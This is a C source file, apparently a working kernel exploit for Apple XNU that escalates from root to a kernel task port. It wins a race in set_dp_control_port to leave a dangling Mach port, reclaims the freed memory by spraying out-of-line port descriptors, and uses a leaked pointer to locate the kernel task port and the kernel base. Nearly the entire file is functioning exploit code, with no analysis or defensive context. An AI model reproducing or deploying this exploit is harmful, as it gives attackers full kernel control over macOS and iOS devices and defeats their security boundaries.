#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <pthread.h>

#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_traps.h>

#include "kernel_sploit.h"
#include "kernel_memory_helpers.h"

// will get set in platform_detection
int n_ports_in_zone = 0x61;
int ram_mb = 1024;

kern_return_t mach_vm_deallocate
(
 vm_map_t target,
 mach_vm_address_t address,
 mach_vm_size_t size
);

extern kern_return_t mach_zone_force_gc(mach_port_t);

kern_return_t mach_vm_read
(
 vm_map_t target_task,
 mach_vm_address_t address,
 mach_vm_size_t size,
 vm_offset_t *data,
 mach_msg_type_number_t *dataCnt
);

mach_port_t q() {
  mach_port_t p = MACH_PORT_NULL;
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
  mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
  return p;
}

struct ool_msg  {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_ports_descriptor_t ool_ports;
};

struct ool_rcv_msg  {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_ports_descriptor_t ool_ports;
  mach_msg_trailer_t trailer;
};

struct ool_multi_msg  {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_ports_descriptor_t ool_ports[1000];
};

struct ool_multi_msg_rcv  {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_ports_descriptor_t ool_ports[1000];
  mach_msg_trailer_t trailer;
};

int is_port_kernel_task_port(mach_port_t kt_port, uint64_t kernel_address) {
  int pid = 0x41414141;
  kern_return_t err = pid_for_task(kt_port, &pid);
  return (err == KERN_SUCCESS && pid == 0);
}

mach_port_t receive_ool_ports(mach_port_t q, mach_port_t expected, uint64_t valid_kernel_pointer) {
  kern_return_t err;
  
  struct ool_multi_msg_rcv msg = {0};
  err = mach_msg(&msg.hdr,
                 MACH_RCV_MSG,
                 0,
                 sizeof(struct ool_multi_msg_rcv),
                 q,
                 0,
                 0);
  if (err != KERN_SUCCESS) {
    printf("failed to receive ool ports msg (%s)\n", mach_error_string(err));
    exit(EXIT_FAILURE);
  }
  
  mach_port_t interesting_port = MACH_PORT_NULL;
  mach_port_t kernel_task_port = MACH_PORT_NULL;
  
  for (int i = 0; i < 1000; i++) {
    mach_msg_ool_ports_descriptor_t* ool_desc = &msg.ool_ports[i];
    mach_port_t* ool_ports = (mach_port_t*)ool_desc->address;
    for (size_t j = 0; j < ool_desc->count; j++) {
      mach_port_t port = ool_ports[j];
      if (port == expected) {
        ;
      } else if (port != MACH_PORT_NULL) {
        interesting_port = port;
        printf("found an interesting port 0x%x\n", port);
        if (kernel_task_port == MACH_PORT_NULL &&
            is_port_kernel_task_port(interesting_port, valid_kernel_pointer))
        {
          kernel_task_port = interesting_port;
        }
      }
    }
    mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)ool_desc->address, ((ool_desc->count*4)+0xfff)&~0xfff);
  }
  
  return kernel_task_port;
}
mach_port_t send_ool_ports(mach_port_t to_send) {
  kern_return_t err;
  mach_port_t q;
  mach_port_allocate(mach_task_self(),
                     MACH_PORT_RIGHT_RECEIVE,
                     &q);
  
  // 1 kalloc page of ports
  
  // this will end up over a mach port object; we need to make sure the following three fields line up
  // +0x08 -> zero (a lock)
  // +0x90 -> context pointer we can r/w from userspace
  // +0x98 -> zero (is_guarded)
  //
  // the port object is 0xa8 and allocations are packed into three or four page blocks
  // python says we can replace this with a single page and all the offsets will
  // match no matter which page we end up on
  
  size_t n_ports = 0x200;
  mach_port_t* ports = calloc(sizeof(mach_port_t), n_ports);
  uint32_t obj_offset = 0x90;
  for (int i = 0; i < n_ports_in_zone; i++) {
    uint32_t index = (obj_offset & 0xfff) / 8;
    ports[index] = to_send;
    obj_offset += 0xa8;
  }
  
  // build a message with those ool ports:
  struct ool_multi_msg* leak_msg = malloc(sizeof(struct ool_multi_msg));
  memset(leak_msg, 0, sizeof(struct ool_msg));
  
  leak_msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
  leak_msg->hdr.msgh_size = sizeof(struct ool_msg);
  leak_msg->hdr.msgh_remote_port = q;
  leak_msg->hdr.msgh_local_port = MACH_PORT_NULL;
  leak_msg->hdr.msgh_id = 0x41414141;
  
  leak_msg->body.msgh_descriptor_count = 1000;
  
  for (int i = 0; i < 1000; i++) {
    leak_msg->ool_ports[i].address = ports;
    leak_msg->ool_ports[i].count = n_ports;
    leak_msg->ool_ports[i].deallocate = 0;
    leak_msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
    leak_msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    leak_msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
  }
  
  // send it:
  err = mach_msg(&leak_msg->hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(struct ool_multi_msg),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  if (err != KERN_SUCCESS) {
    printf("%s\n", mach_error_string(err));
    exit(EXIT_FAILURE);
  }
  free(ports);
  return q;
}


mach_port_t* ports_to_stash = NULL;
int n_stashed_ports = 0;

void begin_stash(int n_ports) {
  ports_to_stash = calloc(sizeof(mach_port_t), n_ports);
}

void stash_port(mach_port_t p) {
  ports_to_stash[n_stashed_ports++] = p;
}

mach_port_t stashed_ports_q = MACH_PORT_NULL;

void end_stash() {
  kern_return_t err;
  mach_port_allocate(mach_task_self(),
                     MACH_PORT_RIGHT_RECEIVE,
                     &stashed_ports_q);
  
  struct ool_msg* stash_msg = malloc(sizeof(struct ool_msg));
  memset(stash_msg, 0, sizeof(struct ool_msg));
  
  stash_msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
  stash_msg->hdr.msgh_size = sizeof(struct ool_msg);
  stash_msg->hdr.msgh_remote_port = stashed_ports_q;
  stash_msg->hdr.msgh_local_port = MACH_PORT_NULL;
  stash_msg->hdr.msgh_id = 0x41414141;
  
  stash_msg->body.msgh_descriptor_count = 1;
  
  stash_msg->ool_ports.address = ports_to_stash;
  stash_msg->ool_ports.count = n_stashed_ports;
  stash_msg->ool_ports.deallocate = 0;
  stash_msg->ool_ports.disposition = MACH_MSG_TYPE_MAKE_SEND; // we don't hold a send for these ports
  stash_msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
  stash_msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
  
  // send it:
  err = mach_msg(&stash_msg->hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(struct ool_msg),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  if (err != KERN_SUCCESS) {
    printf("%s\n", mach_error_string(err));
  }
}


void free_stashed_ports() {
  mach_port_destroy(mach_task_self(), stashed_ports_q);
}

#if 0
// stash a reference with the kernel
void stash(mach_port_t p) {
  mach_ports_register(mach_task_self(), &p, 1);
}

// drop the stashed reference
void free_it() {
  mach_port_t p = MACH_PORT_NULL;
  mach_ports_register(mach_task_self(), &p, 1);
}
#endif

// did we get a notification message?
int got_no_more_senders(mach_port_t q) {
  kern_return_t err;
  mach_port_seqno_t msg_seqno = 0;
  mach_msg_size_t msg_size = 0;
  mach_msg_id_t msg_id = 0;
  mach_msg_trailer_t msg_trailer; // NULL trailer
  mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
  err = mach_port_peek(mach_task_self(),
                       q,
                       MACH_RCV_TRAILER_NULL,
                       &msg_seqno,
                       &msg_size,
                       &msg_id,
                       (mach_msg_trailer_info_t)&msg_trailer,
                       &msg_trailer_size);
  
  if (err == KERN_SUCCESS && msg_id == 0x46) {
    printf("got NMS\n");
    return 1;
  }
  return 0;
}

volatile int go = 0;
volatile int racer_done = 0;

void* dp_control_port_racer_thread(void* arg) {
  pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
  mach_port_t host_priv = (mach_port_t)arg;
  for(;;) {
    while (!go && !racer_done) {;}
    if (racer_done) {
      return NULL;
    }
    set_dp_control_port(host_priv, MACH_PORT_NULL);
    go = 0;
  }
  return NULL;
}


// prepare the port p so that when you call
// free_it() the port will be freed leaving a
// dangling entry in the ipc_entrys table

// p should be a port with just a receive right
// since we use no-more-senders notifications to determine when we win the race

// we have already stashed a send right for this port with the kernel
void prepare_port(mach_port_t p, mach_port_t host_priv) {
  kern_return_t err;
  
  // give ourselves a send right
  mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
  
  // allocate a port to receive no-more-senders notifications on
  mach_port_t notify_q = MACH_PORT_NULL;
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify_q);
  
  // request no-more-senders for the target port:
  mach_port_t old_so = MACH_PORT_NULL;
  err = mach_port_request_notification(mach_task_self(),
                                       p,
                                       MACH_NOTIFY_NO_SENDERS,
                                       0,
                                       notify_q,
                                       MACH_MSG_TYPE_MAKE_SEND_ONCE,
                                       &old_so);
  if (err != KERN_SUCCESS) {
    printf("failed to register for no-more-senders notification (%s)\n", mach_error_string(err));
    exit(EXIT_FAILURE);
  }
  
  printf("about to start trying to win the race\n");
  
  int attempts = 0;
  int max_attempts = 200000;
  for (; attempts < max_attempts; attempts++) {
    // set the dp_control_port
    err = set_dp_control_port(host_priv, p);
    
    if (err != KERN_SUCCESS) {
      printf("failed: %s\n", mach_error_string(err));
      printf("are you root? this is a root -> kernel bug\n");
      exit(EXIT_FAILURE);
    }
    
    // drop our send right
    mach_port_deallocate(mach_task_self(), p);
    
    // at this point there are two send rights;
    // the one held by the dp_control port and the one held by the
    // stashed port
    
    // there are three references:
    //  1) the entry in our ports table
    //  2) the dp_control port
    //  3) the stashed port
    
    // we'll trigger the bug which should drop two of those references but still leave two port pointers
    // (the one in our table and the stashed port)
    // we'll know if we won the race because we'll get a no-more-senders notification :)
    
    go = 1;
    
    set_dp_control_port(host_priv, MACH_PORT_NULL);
    
    if (got_no_more_senders(notify_q)) {
      break;
    }
    // we lost, so give ourselves back a send right and set stuff up again
    mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
  }
  
  if (attempts == max_attempts) {
    printf("no dice - failed to win the race condition. High system load?\n");
    sleep(10);
    exit(EXIT_FAILURE);
  }
  
  printf("won the race after %d attempts!\n", attempts+1);
}

uint64_t find_kernel_base(mach_port_t ktp, uint64_t hostport_addr, uint64_t* _realhost) {
  uint64_t realhost = r64(ktp, hostport_addr+0x68);
  printf("realhost: 0x%llx\n", realhost);
  
  *_realhost = realhost;
  
  uint64_t base = realhost & ~0xfffULL;
  // walk down to find the magic:
  for (int i = 0; i < 0x10000; i++) {
    if (r32(ktp, base) == 0xfeedfacf) {
      return base;
    }
    base -= 0x1000;
  }
  return 0;
}

mach_port_t sploit(mach_port_t host_priv, uint64_t* kernel_base, uint64_t* realhost) {
  kern_return_t err;

  
  // we can also use the host_priv port for this, also give us the advantage of
  // locating the kernel more easily via realhost later
  
  // clean stuff up before we start
  mach_zone_force_gc(host_priv);
  
  // allocate a lot of ports
  // int n_early_ports = 20000;
  int n_early_ports = ram_mb * 20;
  int n_middle_ports = 0x20; //0x49; // how many ports do we need to try to get the kernel task port
  int n_late_ports = 5000;
  mach_port_t early_ports[n_early_ports];
  mach_port_t middle_ports[n_middle_ports];
  mach_port_t late_ports[n_late_ports];
  
  printf("about to allocate ports\n");
  
  for (int i = 0; i < n_early_ports; i++) {
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &early_ports[i]);
  }
  for (int i = 0; i < n_middle_ports; i++) {
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &middle_ports[i]);
  }
  for (int i = 0; i < n_late_ports; i++) {
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &late_ports[i]);
  }
  
  printf("allocated ports\n");
  
  // stash a reference to the middle ports with the kernel:
  begin_stash(n_middle_ports);
  for (int i = 0; i < n_middle_ports; i++) {
    stash_port(middle_ports[i]);
  }
  end_stash();
  
  printf("stashed ports\n");
  
  pthread_t racer_thread;
  pthread_create(&racer_thread, NULL, dp_control_port_racer_thread, (void*)host_priv);
  
  for(int i = 0 ; i < n_middle_ports; i++) {
    prepare_port(middle_ports[i], host_priv);
  }
  
  racer_done = 1;
  pthread_join(racer_thread, NULL);
  
  printf("prepared ports and stopped racer thread\n");
  
  // destroy all the ports, and free the middle ones leaving the dangling refs in our ipc_entries table
  for (int i = 0; i < n_early_ports; i++) {
    mach_port_destroy(mach_task_self(), early_ports[i]);
  }
  
  free_stashed_ports();
  
  for (int i = 0; i < n_late_ports; i++) {
    mach_port_destroy(mach_task_self(), late_ports[i]);
  }
  
  // force gc to reclaim the pages from the ipc.ports zone
  for (int i = 0; i < 10; i++) {
    mach_zone_force_gc(host_priv);
  }
  
  // enough to work reliably without exhausting limits.
  int n_ool_port_qs = ram_mb / 25;
  mach_port_t ool_port_qs[n_ool_port_qs];
  
  // get the target page reused by the ool port pointers
  for (int i = 0; i < n_ool_port_qs; i++) {
    ool_port_qs[i] = send_ool_ports(host_priv);
  }
  
  uint64_t context = 123;
  mach_port_get_context(mach_task_self(), middle_ports[0], &context);
  printf("read context value: 0x%llx\n", context);
  
  // we disclosed a pointer which is on the same three pages as the kernel task port
  // work out the base of that region then set the contexts of all the middle
  // ports to all the possible values for the kernel task pointer:
  
  uint64_t pages_base = context & ~0xfffULL;
  if ((context&0xfff) % 0xa8 == 0) {
    // on first page:
    ;
  } else if ( ((context&0xfff)+0x1000) % 0xa8 == 0) {
    // on second page:
    pages_base -= 0x1000;
  } else if ( ((context&0xfff)+0x2000) % 0xa8 == 0) {
    // on third page:
    pages_base -= 0x2000;
  } else {
    // on fourth page:
    pages_base -= 0x3000;
  }
  
  printf("guessing the kernel task port pointer is somewhere above %llx\n", pages_base);
  
  for (int i = 0; i < n_middle_ports; i++) {
    // guess the middle slots in the zone block:
    mach_port_set_context(mach_task_self(), middle_ports[i], pages_base+(0xa8 * ((n_ports_in_zone/2) - (n_middle_ports/2) + i)));
  }
  
  mach_port_t kernel_task_port = MACH_PORT_NULL;
  for (int i = 0; i < n_ool_port_qs; i++) {
    mach_port_t new_port = receive_ool_ports(ool_port_qs[i], host_priv, pages_base);
    if (new_port != MACH_PORT_NULL) {
      kernel_task_port = new_port;
    }
  }
  if (kernel_task_port == MACH_PORT_NULL) {
    return MACH_PORT_NULL;
  }
  
  printf("got kernel task port: 0x%x\n", kernel_task_port);
  
  // we've also found the address of the ipc_port for the host port
  // from which we can determine the kernel base:
  *kernel_base = find_kernel_base(kernel_task_port, context, realhost);
  
  return kernel_task_port;
}

/*
 * page size -> used to know how many pages the ipc ports zone will use per block so we can guess task port addresses
 */
void platform_detection() {
  int page_size = getpagesize();
  
  if (page_size == 0x1000) { // OS X has 4k pages
    n_ports_in_zone = 0x49;
    printf("running with 4k pages");
  } else if (page_size == 0x4000) { // 64-bit iOS has 16k pages
    n_ports_in_zone = 0x61;
    printf("running with 16k pages");
  } else {
    printf("running on an unknown device, YMMV....\n");
    n_ports_in_zone = 0x49;
  }

}

mach_port_t get_kernel_task_port(mach_port_t host_priv, uint64_t* kernel_base, uint64_t* realhost) {
  platform_detection();
  return sploit(host_priv, kernel_base, realhost);
}

